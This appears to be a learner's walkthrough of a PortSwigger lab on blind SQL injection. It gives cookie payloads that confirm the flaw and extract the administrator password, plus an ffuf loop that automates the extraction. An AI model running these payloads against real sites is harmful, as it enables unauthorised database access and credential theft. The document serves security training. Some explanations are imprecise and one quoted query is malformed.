https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

### Confirming SQLI
So geting a deep understanding of the lab (in this case is just read the description), we know that the cookie is being used in the SQL database, so we will do the injection there.
After do more than one request a 'Welcome back' should be displayed, to confirm the SQL injection lets do a simple boolean condition:
```Cookie
TrackingId=xyz' AND '1'='2
```
If this didn't display the welcome we confirm the SQLI vulnerability, because the condition is evaluated as false so the cookie isn't valid, and as the 'Welcome back' paragraph depends on this, simply it isn't displayed.

### Confirming USERS table
Using this payload:
```cookie
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

`(SELECT 'a' FROM users LIMIT 1)` this is **fetch a Single Row** (`LIMIT 1`), and it's selecting the letter 'a' from the users table, so if there's any table which start with a this will be truly, so `(SELECT 'a' FROM users LIMIT 1)='a'` would be truth it there's any row on the **users table**.

So here we are using the AND operator, this means the query returns true if both conditions (the cookie which is truly) and the sub-query are truly, then the 'welcome' will be displayed.
The query resulting would look like:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'
```

### Confirming the existing of administrator (row)
Now instead of fetch a sengle row let's select the row where the **username column** it's equal to admin:
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Resulting query**:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'
```
As the query is truly we’ll see “Welcome back,” indicating `administrator` is a valid user.

### Determining the password of administrator row
Now by using the subquery `(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)` we are selcting the row from users table where it's a username column equals to "administrator" string, which we confirm previously it's true, and we are checking whether the length of the string from the password column (all in the same row) it's bigger than one.
The **payload** is 
```sh
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
and this is selecting the a letter of administrator, this sub-query will return the constant value `'a'` only if a row exists in the `users` table where `username = 'administrator'`. So if username administrator do not exists then the request will be a false and "welcome" will be never displayed.
**Resulting query**:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'
```
If it's equal or less nothin be displayed.

### Extract the password
```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
By using `SUBSTRING(password,1,1)` we are extracting the single character from the password column the argument 'password' specifies the column to extract the sub-string from, the 1 is the starting position, and the second 1 specifies the length, or number of characters to extract (1 = only one character).
So we are selecting a character from the users table where the username is equal to administrator, and that will return true if the character we are matching the correct letter.
**Resulting query**:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
```
### Solution
To solve the lab do in the terminal (password.txt should be empty):
```sh
for (( i=1; i<=20; i++ )); do
ffuf -u "https://YOUR_LAB_ID.web-security-academy.net/filter?category=Corporate+gifts" -w /usr/share/seclists/Fuzzing/alphanum-case.txt -v  -H "Cookie: TrackingId=YOUR_COOKIE' AND (SELECT SUBSTRING(password,$i,1) FROM users WHERE username='administrator')='FUZZ; session=YOUR_COOKIE" -ac -s >>./password.txt
done
cat password.txt | tr -d "\n" | xclip -selection clipboard
```
and paste the password

